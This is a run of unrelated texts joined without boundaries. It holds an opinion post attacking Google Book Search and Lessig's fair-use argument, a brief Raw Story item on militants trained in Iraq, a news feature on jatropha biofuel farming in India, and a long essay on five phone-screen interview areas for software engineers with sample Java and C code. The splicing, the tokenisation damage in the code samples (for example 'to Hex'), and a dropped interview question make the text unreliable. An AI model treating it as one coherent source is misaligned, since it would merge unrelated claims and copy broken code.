Lessig argues that Google 's Book Search project will only have positive benefits for the potential market for or value of the original copyrighted work .
That may be , but I think the reality is , GOOGLE ITSELF is going to be the party that enjoys positive benefits of dusting off and exposing the original copyrighted work to a wider audience .
Google , I would argue , is the clear winner .
Who loses ?
Always a useful question to ask .
The author loses .
They do n't collect Lessig 's " pennies " .
Maybe that 's all they get , but dammit , they should get 'em !
The publisher loses .
Maybe it 's long out of business , maybe it is n't .
It still loses .
Someone 's graves are spinning while Google 's reaping all the rewards .
You know who else loses ?
We all do .
And not in the way Lessig thinks we do .
We all lose because what Google is doing is hastening the demise of libraries .
Hastening the demise of books .
Hastening the requirement that you must have a computer , and a network connection , to get access to books .
Face it : books are toast .
Google Book Search is the toaster .
What 's Next ?
So let 's see .
If Google wins this case , can we expect to see Google Movie Search , and Google Music Search next ?
After all , how else am I going to be able to find long - out - of - print copies of that obscure 1930 movie that nobody 's seen in 75 years ?
Or that obscure 78 record made in 1941 that nobody 's heard since , well , 1941 ?
If Google wants to rescue the cultural output of the world and make it searchable and retrievable , I am all for it .
I just want Google to do it right .
Pay for it .
Spend your billions to track down every rights holder , and negotiate a deal .
With every damn rights holder .
One by one .
It may take 200 years .
So be it .
UPDATE -- 18 Jan 2006
I heard from Andrea Gingerich today and she informs me that she emailed Larry Lessig about his use of her " Pennies " photograph .
She says he wrote back and apologized for using it and said he'd remove it from the video .

Raw Story :
" The Iraq war , which for years has drawn militants from around the world , is beginning to export fighters and the tactics they have honed in the insurgency to neighboring countries and beyond , " The New York Times reports .
According to the report , experts now say that the experience that Jihadists are currently gaining in Iraq will become far more problematic than the training Muslim radicals received in Afghanistan 's terrorist camps .
A report written by former State Department intelligence analyst Dennis Pluchinsky in April stated " battle - hardened militants from Iraq posed a greater threat to the West than extremists who trained in Afghanistan because Iraq had become a laboratory for urban guerrilla tactics . "
In an overgrown corner of Moolchand Sethia 's plantation , runty and unloved , stands what could be the next revolution in the world 's search for renewable fuel .
From China to Brazil , countries have begun setting aside tens of thousands of acres for the cultivation of jatropha – a plant many experts say is the most promising source for biodiesel .
At the same time , companies from Europe and India have begun buying up land throughout Africa to establish jatropha plantations .
As American farmers plan to plant the most corn since World War II to cash in on ethanol , which is added to gasoline , much of the rest of the world is turning to jatropha , which is used as a substitute for diesel fuel .
The two are not competitors , since neither can be used in the other type of fuel .
But jatropha is fast emerging as a candidate for the ideal biofuel .
It is grown in wastelands , needs relatively little care or refinement , and is inedible – meaning it will not take food from the poor for the gas tanks of the rich .
But Mr. Sethia 's modest plantation is a reminder that jatropha has a long way to go .
Although Sethia 's home state of Chhattisgarh has been one of India 's leading jatropha promoters , industries say it could be years before they begin production here .
Until then , Sethia laments , the $ 1,500 he has invested in jatropha has been wasted .
Globally , experts worry that the story could be similar .
Lured by jatropha 's potential , nations and corporations have acted rashly , coming to the " idea that it is the final answer for many problems , " says Kees Daey Ouwens of Fuels from Agriculture in Communal Technology ( FACT ) in Eindhoven , The Netherlands .
It could be .
But it is too early to tell .
" Jatropha is very promising , " he says .
" But there is not enough information … to start on such large scales . "
There is no estimate as to how much jatropha is being cultivated globally , but anecdotal evidence suggests that the trend is accelerating :
• The government - owned China National Offshore Oil Corp. ( CNOOC ) is planning to have 80,000 acres of jatropha in Sichuan Province alone by 2010 .
• Renova Biodiesel of Brazil is expected to plant 60,000 acres of jatropha , and reports suggest that other oil companies are considering planting nearly 500,000 acres in the next four years .
• D1 Oils , a British company that is considered by many to be the leader in jatropha cultivation , has plantations from Swaziland to Indonesia , and hopes to nearly double its 385,000 acres of jatropha worldwide by the end of 2008 .
• The Philippine National Oil Co. recently earmarked $ 14 million for jatropha planting and production , while Indonesia plans to set up 52 biodiesel plants across the country at a cost of $ 7.3 million .
The cause of the excitement is both environmental and economic .
The European Union has mandated that by 2020 all cars must run on 20 percent biodiesel , which burns cleaner than fossil fuels .
A 1998 study , jointly sponsored by the US Department of Energy and the Department of Agriculture , concluded that biodiesel reduces net carbon - dioxide emissions by 78 percent compared with petroleum diesel .
Meanwhile , Asian economies are desperately seeking natural resources to support their growth .
India , for example , imports 70 percent of its fuel , and its planning commission has prioritized the study of domestically grown biofuels in an attempt to become more self - sufficient .
Jatropha is a natural answer .
The leafy bush thrives in arid regions around the equator , has no use as food , and takes little refinement : a hydraulic press to squeeze the oil from the seeds , and a chemical solution to create and filter the fuel .
When the necessary infrastructure is in place – sufficient farms , transport routes , and processing plants – jatropha oil could be no more expensive than regular diesel .
" In 10 years , the production prices will not be much different , " says Mr. Daey Ouwens .
Along with several other states , Chhattisgarh has responded with massive planting campaigns and incentives for farmers , including 500 free saplings .
Sethia received a $ 250 loan for planting jatropha , as well as a commendation from the state .
The problem is , there 's no market here in the Indian outback .
The state says it will buy the seeds , which then must be crushed to create the oil .
But Sethia says he would need to take his harvest to the capital , which is a half - day drive , at least .
The cost of getting them there would outstrip any possible profit .
Then there 's the fact that jatropha needs more care than he had anticipated .
He has let most of his crop fend for itself .
After two years , the plants are knobby fingers less than a foot tall .
A few plants , however , he planted in a ruddy dirt embankment near a seasonal pond and tended regularly .
Their leafy branches arch higher than Sethia himself and are already yielding seeds .
Right now , he says , the economics do n't work .
" But if there is a [ processing ] plant nearby , farmers will grow it , because there is the assurance that they will be able to sell it , " he says .
As it is , he knows of only one other person in the district growing jatropha .
For their part , oil industries are interested in building processing plants .
But it will be several years before there is a critical mass in Chhattisgarh – about 50,000 acres – to justify the costs .
" That has to come up , " says B. B. Choudhary of Indian Oil .
" It has not yet . "
Yet there is also a danger in industries pushing too fast , experts say .
Jatropha cultivation is so new that scientists know little about it , such as ideal conditions for growth , susceptibility to disease , or expected yields per acre .
Some critics even suggest that toxic strains of the plant can cause health problems for workers .
The Energy and Resources Institute in Delhi has set up plantations across India to study these issues for British Petroleum .
In four years , all these knowledge gaps will be filled in , argues Alok Adholeya , who manages the program .
He advises farmers like Sethia to remain patient : " If they are patient enough , they will find some buyers very soon , because the message is getting out . "
five - essential - phone - screen - questions
The Five Essential Phone - Screen Questions
Stevey 's Drunken Blog Rants ™
I 've been on a lot of SDE interview loops lately where the candidate failed miserably : not - inclined votes all around , even from the phone screeners who brought the person in initially .
It 's usually pretty obvious when the candidate should have been eliminated during the phone screens .
Well , it 's obvious in retrospect , anyway : during the interviews , we find some horrible flaw in the candidate which , had anyone thought to ask about it during the phone screen , would surely have disqualified the person .
But we did n't ask .
So the candidate came in for interviews and wound up wasting everyone 's time .
Antipatterns I 've done informal postmortems on at least a hundred phone screens , many of them my own .
Whenever a candidate bombs the interviews , I want to know what went wrong with the screen .
And guess what ?
A pattern has emerged .
Two patterns , actually .
The first pattern is that for most failed phone screens , the candidate did most of the talking .
The screener only asked about stuff on the candidate 's resume , and the candidate was able to talk with passion and enthusiasm about this incredibly cool thing they did , blah blah blah , and the screener was duly impressed .
That 's how many / most phone screens go wrong .
The right way to do a phone screen is to do most of the talking , or at least the driving .
You look for specific answers , and you guide the conversation along until you 've got the answer or you 've decided the candidate does n't know it .
Whenever I forget this , and get lazy and let the candidate drone on about their XML weasel - pin connector project , I wind up bringing in a dud .
The second pattern is that one - trick ponies only know one trick .
Candidates who have programmed mostly in a single language ( e.g. C/C++ ) , platform ( e.g. AIX ) or framework ( e.g. J2EE ) usually have major , gaping holes in their skills lineup .
These candidates will fail their interviews here because our interviews cover a broad range of skill areas .
These two phone screen ( anti - ) patterns are related : if you only ask the candidate about what they know , you 've got a fairly narrow view of their abilities .
And you 're setting yourself up for a postmortem on your phone screen .
Acid Tests
In an effort to make life simpler for phone screeners , I 've put together this list of Five Essential Questions that you need to ask during an SDE screen .
They wo n't guarantee that your candidate will be great , but they will help eliminate a huge number of candidates who are slipping through our process today .
These five areas are litmus tests -- very good ones .
I 've chosen them based on the following criteria : 1 ) They 're universal - every programmer needs to know them , regardless of experience , so you can use them in all SDE phone screens , from college hires through 30 - year veterans .
2 ) They 're quick - they 're areas that you can probe very quickly , without eating too much into your phone - screen time .
Each area can be assessed with 1 to 5 minutes of " weeder questions " , and each area has almost unlimited weeder questions to choose from .
3 ) They 're predictors - there are certain common " SDE profiles " that are easy to spot because they tend to fail ( and I mean really fail ) in one or more of these five areas .
So the areas are amazingly good at weeding out bad candidates .
You have to probe all five areas ; you can't skip any of them .
Each area is a proxy for a huge body of knowledge , and failing it very likely means failing the interviews , even though the candidate did fine in the other areas .
Without further ado , here they are : The Five Essential Questions for the first phone - screen with an SDE candidate : 1 ) Coding .
The candidate has to write some simple code , with correct syntax , in C , C++ , or Java .
2 ) OO design .
The candidate has to define basic OO concepts , and come up with classes to model a simple problem .
3 ) Scripting and regexes .
The candidate has to describe how to find the phone numbers in 50,000 HTML pages .
4 ) Data structures .
The candidate has to demonstrate basic knowledge of the most common data structures .
5 ) Bits and bytes .
The candidate has to answer simple questions about bits , bytes , and binary numbers .
Please understand : what I 'm looking for here is a total vacuum in one of these areas .
It 's OK if they struggle a little and then figure it out .
It 's OK if they need some minor hints or prompting .
I do n't mind if they 're rusty or slow .
What you 're looking for is candidates who are utterly clueless , or horribly confused , about the area in question .
For example , you may find a candidate who decides that a Vehicle class should be a subclass of ParkingGarage , since garages contain cars .
This is just busted , and it 's un -fixable in any reasonable amount of training time .
Or a candidate might decide , when asked to search for phone numbers in a bunch of text files , to write a 2000 - line C++ program , at which point you discover they 've never heard of " grep " , or at least never used it .
When a candidate is totally incompetent in one of these Big Five areas , the chances are very high that they 'll bomb horribly when presented with our typical interview questions .
Last week I interviewed an SDE - 2 candidate who made both of the mistakes above ( a vehicle inheriting from garage , and the 2000 - line C++ grep implementation . )
He was by no means unusual , even for the past month .
We 've been bringing in many totally unqualified candidates .
The rest of this document describes each area in more detail , and gives example questions , and solutions .
Area Number One : Coding
The candidate has to write some code .
Give them a coding problem that requires writing a short , straightforward function .
They can write it in whatever language they like , as long as they do n't just call a library function that does it for them .
It should be a trivial problem , one that even a slow candidate can answer in 5 minutes or less .
( If the candidate seems insulted by the thought of having to get their hands dirty with a trivial coding question , after all their years of experience , patents , etc. , tell them it 's required procedure and ask them to humor you .
If they refuse , tell them we only interview people who can demonstrate coding skills over the phone , thank them for their time , and end the call . )
Give them a few minutes to write and hand - simulate the code .
Tell them they need to make it syntactically correct and complete .
Make them read the code to you over the phone .
Copy down what they read back .
Put it into your writeup .
If they 're sloppy , or do n't want to give you exact details , give them one more chance to correct it , and then go with Not Inclined .
( Note added 10/6/04 ) -- another good approach being used by many teams is to give the candidate " homework " .
E.g. you can give them an hour to solve some coding problem ( harder than the ones below ) and email the solution to you .
Works like a charm .
Definitely preferable to reading code over the phone .
Anyway , here are some examples .
I 've given solutions in Java , mostly .
I 've gone back and forth on accepting solutions in other languages ( e.g. Ruby , Perl , Python ) , and I 've decided that candidates need to be able to code their answers in C , C++ or Java .
It 's wonderful if they know other languages , and in fact those who do tend to do a lot better overall .
But to be an Amazon SDE , you need to prove you can do C++ or Java first .
Example 1 : Write a function to reverse a string .
Example Java code : public static String reverse ( String s ) {
int length = s.length ( ) , last = length - 1 ;
char[ ] chars = s.toCharArray ( ) ;
for ( int i = 0 ; i < length / 2 ; i++ ) {
char c = chars [ i ] ;
chars [ i ] = chars [ last - i ] ;
chars [ last - i ] = c ;
}
return new String ( chars ) ;
}
Example output for " Madam , I'm Adam " : madA m'I , madaM Example 2 : Write function to compute Nth fibonacci number : Java and C / C++ : static long fib( int n ) {
return n <= 1 ? n : fib( n - 1 ) + fib ( n - 2 ) ;
}
( Java Test harness ) public static void main ( String [ ] args ) {
for ( int i = 0 ; i < 10 ; i++ ) {
System.out .print ( fib( i ) + " , " ) ;
}
System.out.println ( fib ( 10 ) ) ;
}
( C/C++ Test Harness ) main ( ) {
for ( int i = 0 ; i < 10 ; i++ ) {
printf ( " %d , " , fib ( i ) ) ;
}
printf ( " %d
" , fib ( 10 ) ) ;
}
Test harness output : 0 , 1 , 1 , 2 , 3 , 5 , 8 , 13 , 21 , 34 , 55 Example 3 : Print out the grade - school multiplication table up to 12x12 Java : ( similar for C/ C++ ) public static void multTables ( int max )
{
for ( int i = 1 ; i <= max ; i++ ) {
for ( int j = 1 ; j <= max ; j++ ) {
System.out.print ( String.format ( " %4d " , j * i ) ) ;
}
System.out.println ( ) ;
}
}
Example output : 1 2 3 4 5 6 7 8 9 10 11 12
2 4 6 8 10 12 14 16 18 20 22 24
3 6 9 12 15 18 21 24 27 30 33 36
4 8 12 16 20 24 28 32 36 40 44 48
5 10 15 20 25 30 35 40 45 50 55 60
6 12 18 24 30 36 42 48 54 60 66 72
7 14 21 28 35 42 49 56 63 70 77 84
8 16 24 32 40 48 56 64 72 80 88 96
9 18 27 36 45 54 63 72 81 90 99 108
10 20 30 40 50 60 70 80 90 100 110 120
11 22 33 44 55 66 77 88 99 110 121 132
12 24 36 48 60 72 84 96 108 120 132 144
Example 4 : Write a function that sums up integers from a text file , one int per line .
Java : public static void sumFile ( String name ) {
try {
int total = 0 ;
BufferedReader in = new BufferedReader ( new FileReader ( name ) ) ;
for ( String s = in.readLine ( ) ; s != null ; s = in.readLine ( ) ) {
total += Integer.parseInt ( s ) ;
}
System.out.println ( total ) ;
in.close ( ) ;
}
catch ( Exception xc ) {
xc.printStackTrace ( ) ;
}
}
Example 5 : Write function to print the odd numbers from 1 to 99 .
C/C++ : void printOdds ( ) {
for ( int i = 1 ; i < 100 ; i += 2 ) {
printf ( " %d
" , i ) ; // or cout << i << endl ;
}
}
Java : public static void printOdds ( ) {
for ( int i = 1 ; i < 100 ; i += 2 ) {
System.out.println ( i ) ;
}
}
Example 6 : Find the largest int value in an int array .
Java : public static int largest ( int [ ] input ) {
int max = Integer .
MIN_VALUE ;
for ( int i = 0 ; i < input.length ; i++ ) {
if ( input [ i ] > max ) { max = input [ i ] ; }
}
return max ;
}
Example 7 : Format an RGB value ( three 1 - byte numbers ) as a 6 - digit hexadecimal string .
Java : public String formatRGB ( int r , int g , int b ) {
return ( toHex ( r ) + to Hex ( g ) + to Hex ( b ) ) .toUpperCase ( ) ;
}
public String toHex ( int c ) {
String s = Integer.toHexString ( c ) ;
return ( s.length ( ) == 1 ) ? " 0 " + s : s ;
}
Or in Java 1.5 : public String formatRGB ( int r , int g , int b ) {
return String.format ( " %02X%02X%02X " , r , g , b ) ;
}
Example output for ( 255 , 0 , 128 ) :
You can ask any question you like ; does n't have to be one of the ones above .
They 're just examples .
Some properties of a good weeder phone - screen coding question are : It 's simple .
It has to be something that you should be able to solve , trivially , in about 2 minutes or less .
Not too tricky .
Basic stuff .
You 've solved it .
You should n't ask a question unless you 've solved it yourself recently , so you know it 's a reasonable question , and you can evaluate their answer to it .
You should consider coding it yourself during the time you 've given them to do it .
It has loops or recursion .
Recursion is actually preferable .
Being able to reason recursively or inductively is important for many areas of computing , including using heirarchical data representations ( e.g. XML ) , distributed computing , searching , and sorting .
Many candidates simply can't think recursively , and this often goes undetected until interview - time .
Try to find out at compile - time !
Er , phone - screen time , that is .
It has formatted output .
This is a basic skill , useful for debugging , simple report generation , and lots of other things .
" printf " is a universal standard ; it exists in C , C++ , Java , Perl , Ruby , Python , and virtually every other mainstream language , at least as a library call .
Like file I/O , it 's a good indicator as to whether the candidate has written " real " code before .
It has text - file I/O. Candidates who have worked in frameworks for too long often become unable to function as programmers outside that framework .
Not being able to do simple file I/O is a common indicator that they 've grown overly dependent on a particular framework .
It 's hard to cover all these things and still be a short weeder question .
If you think of a question that has all these properties , let me know .
Area Number Two : Object - Oriented Programming
We should n't hire SDEs ( arguably excepting college hires ) who are n't at least somewhat proficient with OOP .
I 'm not claiming that OOP is good or bad ; I 'm just saying you have to know it , just like you have to know the things you can and can't do at an airport security checkpoint .
Two reasons : 1 ) OO has been popular / mainstream for more than 20 years .
Virtually every programming language supports OOP in some way .
You can't work on a big code base without running into it .
2 ) OO concepts are an important building block for creating good service interfaces .
They represent a shared understanding and a common vocabulary that are sometimes useful when talking about architecture .
So you have to ask candidates some OO stuff on the phone . a ) Terminology
The candidate should be able to give satisfactory definitions for a random selection of the following terms : class , object ( and the difference between the two ) instantiation method ( as opposed to , say , a C function ) virtual method , pure virtual method class / static method static / class initializer constructor destructor / finalizer superclass or base class subclass or derived class inheritance encapsulation multiple inheritance ( and give an example ) delegation / forwarding composition / aggregation abstract class interface / protocol ( and different from abstract class ) method overriding method overloading ( and difference from overriding ) polymorphism ( without resorting to examples ) is - a versus has - a relationships ( with examples ) method signatures ( what 's included in one ) method visibility ( e.g. public / private / other )
These are just the bare basics of OO .
Candidates should know this stuff cold .
It 's not even a complete list ; it 's just off the top of my head .
Again , I 'm not advocating OOP , or saying anything about it , other than that it 's ubiquitious so you have to know it .
You can learn this stuff by reading a single book and writing a little code , so no SDE candidate ( except maybe a brand - new college hire ) can be excused for not knowing this stuff .
I draw a distinction between " knows it " and " is smart enough to learn it . "
Normally I allow people through for interviews if they 've got a gap in their knowledge , as long as I think they 're smart enough to make it up on the job .
But for these five areas , I expect candidates to know them .
It 's not just a matter of being smart enough to learn them .
There 's a certain amount of common sense involved ; I can't imagine coming to interview at Amazon and not having brushed up on OOP , for example .
But these areas are also so fundamental that they serve as real indicators of how the person will do on the job here .
b) OO Design
This is where most candidates fail with OO .
They can recite the textbook definitions , and then go on to produce certifiably insane class designs for simple problems .
For instance :
They may have Person multiple - inherit from Head , Body , Arm , and Leg .
They may have Car and Motorcycle inherit from Garage .
They may produce an elaborate class tree for Animals , and then declare an enum ( " Lion = 1 , Bear = 2 " , etc. ) to represent the type of each animal .
They may have exactly one static instance of every class in their system .
( All these examples are from real candidates I 've interviewed in the past 3 weeks . )
Candidates who 've only studied the terminology without ever doing any OOP often do n't really get it .
When they go to produce classes or code , they do n't understand the difference between a static member and an instance member , and they 'll use them interchangeably .
Or they wo n't understand when to use a subclass versus an attribute or property , and they 'll assert firmly that a car with a bumper sticker is a subclass of car .
( Yep , 2 candidates have told me that in the last 2 weeks . )
Some do n't understand that objects are supposed to know how to take care of themselves .
They 'll create a bunch of classes with nothing but data , getters , and setters ( i.e. , basically C structs ) , and some Manager classes that contain all the logic ( i.e. , basically C functions ) , and voila , they 've implemented procedural programming perfectly using classes .
Or they wo n't understand the difference between a char* , an object , and an enum .
Or they 'll think polymorphism is the same as inheritance .
Or they 'll have any number of other fuzzy , weird conceptual errors , and their designs will be fuzzy and weird as well .
For the OO - design weeder question , have them describe :
What classes they would define .
What methods go in each class ( including signatures ) .
What the class constructors are responsible for .
What data structures the class will have to maintain .
Whether any Design Patterns are applicable to this problem .
Here are some examples : Design a deck of cards that can be used for different card game applications .
Likely classes : a Deck , a Card , a Hand , a Board , and possibly Rank and Suit .
Drill down on who 's responsible for creating new Decks , where they get shuffled , how you deal cards , etc .
Do you need a different instance for every card in a casino in Vegas ?
Model the Animal kingdom as a class system , for use in a Virtual Zoo program .
Possible sub-issues : do they know the animal kingdom at all ?
( I.e. common sense . )
What properties and methods do they immediately think are the most important ?
Do they use abstract classes and / or interfaces to represent shared stuff ?
How do they handle the multiple - inheritance problem posed by , say , a tomato ( fruit or veggie ? ) , a sponge ( animal or plant ? ) , or a mule ( donkey or horse ? )
Create a class design to represent a filesystem .
Do they even know what a filesystem is , and what services it provides ?
Likely classes : Filesystem , Directory , File , Permission .
What 's their relationship ?
How do you differentiate between text and binary files , or do you need to ?
What about executable files ?
How do they model a Directory containing many files ?
Do they use a data structure for it ?
Which one , and what performance tradeoffs does it have ?
Design an OO representation to model HTML .
How do they represent tags and content ?
What about containment relationships ?
Bonus points if they know that this has already been done a bunch of times , e.g. with DOM .
But they still have to describe it .
The following commonly - asked OO design interview questions are probably too involved to be good phone - screen weeders : Design a parking garage .
Design a bank of elevators in a skyscraper .
Model the monorail system at Disney World .
Design a restaurant - reservation system .
Design a hotel room - reservation system .
A good OO design question can test coding , design , domain knowledge , OO principles , and so on .
A good weeder question should probably just target whether they know when to use subtypes , attributes , and containment .
Area Number Three : Scripting and Regular Expressions Many C/C++/ Java candidates , even some with 10 + years of experience , would happily spend a week writing a 2,500 - line program to do something you could do in 30 seconds with a simple Unix command .
I now pose the following question to ALL candidates , whether on the phone or in an interview , because it eliminates so many of them :
Last year my team had to remove all the phone numbers from 50,000 Amazon web page templates , since many of the numbers were no longer in service , and we also wanted to route all customer contacts through a single page .
Let 's say you 're on my team , and we have to identify the pages having probable U.S. phone numbers in them .
To simplify the problem slightly , assume we have 50,000 HTML files in a Unix directory tree , under a directory called " / website " .
We have 2 days to get a list of file paths to the editorial staff .
You need to give me a list of the .html files in this directory tree that appear to contain phone numbers in the following two formats : ( xxx ) xxx -xxxx and xxx - xxx - xxxx .
How would you solve this problem ?
Keep in mind our team is on a short ( 2 - day ) timeline .
Here are some facts for you to ponder :
Our Contact Reduction team really did have exactly this problem in 2003 .
This is n't a made - up example .
Someone on our team produced the list within an hour , and the list supported more than just the 2 formats above .
About 25 % to 35 % of all software development engineer candidates , independent of experience level , cannot solve this problem , even given the entire interview hour and lots of hints .
I take as much time as necessary to explain the problem to candidates , to ensure that they understand it and can paraphrase the problem requirements correctly .
For the record , I 'm not being tricky here .
Once candidates start down the wrong path ( i.e. writing a gigantic C++ program to open every file and parse character by character , using a home - grown state machine ) , I stop them , tell them this will take too long , and ask if there are any other possibilities .
I ask if there are any tools or utilities that might be of use .
I give them plenty of hints , and ultimately I tell them the answer .
Even after I tell them the answer , they often still do n't get it .
Here 's one of many possible solutions to the problem : grep -l - R -- perl - regexp " \b( \( \d{3}\ ) \s* |\d{3}-) \d{3}-\d{4}\b " * > output.txt
But I do n't even expect candidates to get that far , really .
If they say , after hearing the question , " Um... grep ? " then they 're probably OK .
I can ask them for the approximate syntax for the regular expression to use , and as long as they have a reasonable clue , I 'm fine with it .
Heck , if they can tell me where they 'd look to find the syntax , I 'm fine with it .
They can also use find , or write a Perl script ( or awk or bash or etc . ) .
Anything that shows they have even the tiniest inkling of why Unix is Unix .
They can even write a Java or C++ program , provided they can actually write an entire working program in , say , half an hour or less , on the board , or at least convince me that they will get it working quickly .
But I 've only ever had that happen once ; an insanely good C++ programmer burned through a 175 - line C++ program on the whiteboard that more or less solved it .
We made him an offer .
But usually they throw in the towel when they find out they have to remember how to do file I/O , or traverse a directory tree .
For what it 's worth , this failure mode is unique to Java and C/ C++ programmers .
Perl programmers laugh and solve it in 30 seconds or less .
I have some easy questions that make Perl programmers cry , but this is n't one of them .
In my experience , a programmer who only knows one language ( where C and C++ count as one language for this exercise ) is usually completely lost in one of these Five Essential Areas .
You do n't necessarily have to ask the HTML phone - number question .
Another one I used to ask , one that worked equally well , was : Let 's say you 're on my team , and I 've decided I 'm a real stickler for code formatting .
But I 've got peculiar tastes , and one day I decide I want to have all parentheses stand out very clearly in your code .
So let 's say you 've got a set of source files in C , C++ , or Java .
Your choice .
And I want you to modify them so that in each source file , every open - and close - paren has exactly one space character before and after it .
If there is any other whitespace around the paren , it 's collapsed into a single space character .
For instance , this code : foo ( bar ( new Point ( x , graph.get Y ( ) ) ) ) ;
Would be modified to look like this : foo ( bar ( new Point ( x , graph.getY ( ) ) ) ) ;
I tell you ( as your manager ) that I do n't care how you solve this problem .
You can take the code down to Kinko's Copies and manually cut and paste the characters with scissors if you like .
How will you solve this problem ?
Same thing , more or less .
You 'd do it with a Unix command like sed ( using a regular expression ) , or do it in your editor using a regex , or write a quick Ruby script , whatever .
I 'd even accept having them use a source - code formatter , provided they can tell me in detail how to use it , during the interview ( to a level of detail that convinces me they 've used it before . )
There are all sorts of variations on this problem .
Generally you want to come up with a real - life scenario that involves searching text files for patterns , and see if the candidate wants to solve it by writing a giant chunk of C++ or Java code .
Area Number Four : Data Structures SDE candidates need to demonstrate a basic understanding of the most common data structures , and of the fundamentals of " big - O " algorithmic complexity analysis .
Here 's what they need to know about big -O .
They need to know that algorithms usually fall into the following performance classes : constant - time , logarithmic , linear , polynomial , exponential , and factorial .
For the standard data structures in java.util , STL , or those built into a higher - level language , they need to know the big - O complexity for the operations on those data structures .
Example : they should know that finding an element in a hashtable is usually constant - time , that finding an element in a balanced binary tree is order log(n ) , that finding an element in a linked list is order N , and that finding an element in a sorted array is order log (n ) .
Similarly for insert / update / delete operations .
And they should be able to explain why each operation falls into a particular complexity class .
For instance : " Computing a hash value does n't depend on the number of items in the hashtable . "
Or : " you have to search the entire linked list , even if it 's sorted , to find an arbitrary element in it . "
No math needed , no proofs , just explanations .
The ( concrete ) data structures they absolutely must understand are these : 1 ) arrays - I 'm talking about C - language and Java - language arrays : fixed - sized , indexed , contiguous structures whose elements are all of the same type , and whose elements can be accessed in constant time given their indices .
2 ) vectors - also known as " growable arrays " or ArrayLists .
Need to know that they 're objects that are backed by a fixed - size array , and that they resize themselves as necessary .
3 ) linked lists - lists made of nodes that contain a data item and a pointer / reference to the next ( and possibly previous ) node .
4 ) hashtables - amortized constant - time access data structures that map keys to values , and are backed by a real array in memory , with some form of collision handling for values that hash to the same location .
5 ) trees - data structures that consist of nodes with optional data elements and one or more child pointers / references , and possibly parent pointers , representing a heirarchical or ordered set of data elements .
6 ) graphs - data structures that represent arbitrary relationships between members of any data set , represented as networks of nodes and edges .
There are , to be sure , many other important data structures one should know about , but not knowing about the six listed above is inexcusable , and grounds for rejection in a phone screen .
Candidates should be able to describe , for any of the data structures above : what you use them for ( real - life examples )
why you prefer them for those examples
the operations they typically provide ( e.g. insert , delete , find )
the big- O performance of those operations ( e.g. logarithmic , exponential )
how you traverse them to visit all their elements , and what order they 're visited in
at least one typical implementation for the data structure Candidates should know the difference between an abstract data type such as a Stack , Map , List or Set , and a concrete data structure such as a singly - linked list or a hash table .
For a given abstract data type ( e.g. a Queue ) , they should be able to suggest at least two possible concrete implementations , and explain the performance trade - offs between the two implementations .
Example weeder questions : 1 ) What are some really common data structures , e.g. in java.util ?
2 ) When would you use a linked list vs. a vector ?
3 ) Can you implement a Map with a tree ?
What about with a list ?
4 ) How do you print out the nodes of a tree in level - order ( i.e. first level , then 2nd level , then 3rd level , etc . )
5 ) What 's the worst - case insertion performance of a hashtable ?
Of a binary tree ?
6 ) What are some options for implementing a priority queue ?
And so on .
Just a few quick questions should cover this area , provided you do n't focus exclusively on linear ordered sequences ( lists , arrays , vectors and the like ) .
Area Number Five : Bits and Bytes
This area is fairly contentious , at least inasmuch as people who do n't know this area claim you do n't need to know it .
( Hint : that 's true for everything .
Nobody likes to admit they do n't know something you need to know .
I 'll start : I should know more about math ; it 's inexcusable .
I 'm doing all kinds of stuff the long , slow , dumb way because of my rusty math skills .
But at least I admit it , and I 've been studying my math books semi-regularly in an attempt to repair my skills . )
Candidates do need to know about bits and bytes , at least at the level that I 'm outlining here .
Otherwise they 're prone to having an integer - overflow error in their code that brings the website down and costs us millions .
Or spending a week trying to decode a serialized object they 're debugging .
Or whatever .
Computers do n't have ten fingers ; they have one .
So people need to know this stuff .
Candidates should know what bits and bytes are .
They should be able to count in binary ; e.g. they should be able to tell you what 2^5 or 2^10 is , in decimal .
They should n't stare blankly at you when you ask with 2^16 is .
It 's a special number .
They should know it .
They should know at least the logical operations AND , OR , NOT , and XOR , and how to express them in their favorite / strongest programming language .
They should understand the difference between a bitwise - AND and a logical - AND ; similarly for the other operations .
Candidates should know the probable sizes of the primitive data types for a standard 32 - bit ( e.g. Intel ) architecture .
If they 're a Java programmer , they should know exactly what the primitive types are ( byte , short , int , long , float , double , char , boolean ) and , except for boolean , exactly how much space is allocated for them per the Java Language specification .
Everyone should know the difference between signed and unsigned types , what it does to the range of representable values for that type , and whether their language supports signed vs. unsigned types .
Candidates should know the bitwise and logical operators for their language , and should be able to use them for simple things like setting or testing a specific bit , or set of bits .
Candidates should know about the bit - shift operators in their language , and should know why you would want to use them .
A good weeder question for this area is :
Tell me how to test whether the high - order bit is set in a byte .
Another , more involved one is :
Write a function to count all the bits in an int value ; e.g. the function with the signature int countBits ( int x )
Another good one is : Describe a function that takes an int value , and returns true if the bit pattern of that int value is the same if you reverse it ( i.e. it 's a palindrome ) ; i.e. boolean isPalindrome ( int x )
They do n't have to code the last two , just convince you they 'd take the right approach .
Although if you have them code it correctly , it can count for your Coding weeder question too .
C/C++ programmers should know about the sizeof operator and how ( and why / when ) to use it .
Actually , come to think of it , everyone should know this .
All programmers should be able to count in hexadecimal , and should be able to convert between the binary , octal , and hex representations of a number .
Special Fast - Track Version
That 's it for the Five Essential Phone Screen Questions .
Hope ya liked it .
As a special reward for reading this far , here 's a special Bonus Feature : a set of all - too - common answers that are almost always indicators of certain failure during our interviews .
Even if I 'm not on the loop !
Bad Sign # 1 : Me : So !
What languages have you used , starting with your strongest ?
Them : ( briskly ) C , C ++.
Me : ( long , pregnant pause )
Them : ( waiting patiently for me to continue )
Me : Any others ?
Them : Nope . C , C ++. Translation : ( in thick Southern drawl )
" We got both kinds of music here : country and western . "
Probable failure modes for this candidate :
Will fail the HTML - phone - number question and the OO design question ( but will get the OO terminology definitions mostly right . )
Bad Sign # 1a : Me : So !
What languages are you most familiar / proficient with ?
Them : ( worried ) I 've done mostly Java lately .
Me : ( long , pregnant pause )
Them : Yeah , um , Java .

Um , I did C in school a long time ago , but ... pretty much mostly Java now .
Translation : " Country and Western were both too hardcore for me .
I got beat up in a bar . "
Probable failure modes for this candidate :
Will fail the bits and bytes questions , the HTML - phone - number question , and most of the data structures questions .
Bad Sign # 2 : Me : So !

Them :
Um , doubly - linked lists , and , uh , array lists .
Me : Have you ever used a tree ?
Them : Oh ! ( laughs )
Yeah , um , I forgot about those .
Translation : " My family tree does n't branch . "
Probable failure modes for this candidate : Very likely to fail data structures questions .
Will fail any recursive problem , even a simple one like printing the elements of a linked list recursively .
Will fail the HTML - phone - number question , since they obviously have n't ever used Perl if " hash " did n't leap to mind .
Bad Sign # 3 : Me : So !
What the the primitive types in Java ( or C++ ) ?
Them : Ummmm , there 's , um , int .
